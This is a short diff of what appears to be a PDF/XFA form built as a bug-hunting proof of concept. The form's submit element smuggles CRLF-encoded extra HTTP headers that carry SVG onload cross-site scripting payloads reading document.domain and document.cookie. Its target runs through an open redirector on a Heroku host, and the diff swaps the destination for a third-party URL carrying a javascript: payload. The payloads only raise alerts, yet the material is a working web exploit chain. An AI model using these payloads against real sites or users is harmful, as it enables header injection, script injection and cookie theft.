@@ -20,7 +20,7 @@ stream
                <submit 
                      textEncoding="UTF-8&#xD;&#xA;X-Forwarded-Host: &#x3C;svg/onload=alert(document.domain)&#x3E;&#xD;&#xA;User-Agent: &#x3C;svg/onload=alert(document.cookie)&#x3E;"
                      xdpContent="pdf datasets template"
-                     target="https://bughunt1307.herokuapp.com/redirector.php?x=https://www.ebay-kleinanzeigen.de/info.jsp"/>
+                     target="https://bughunt1307.herokuapp.com/redirector.php?x=https://www.google.com/earth/client/sharing/index_en.html#image=javascript:alert(0)"/>
             </event>
 </field>
     </subform>
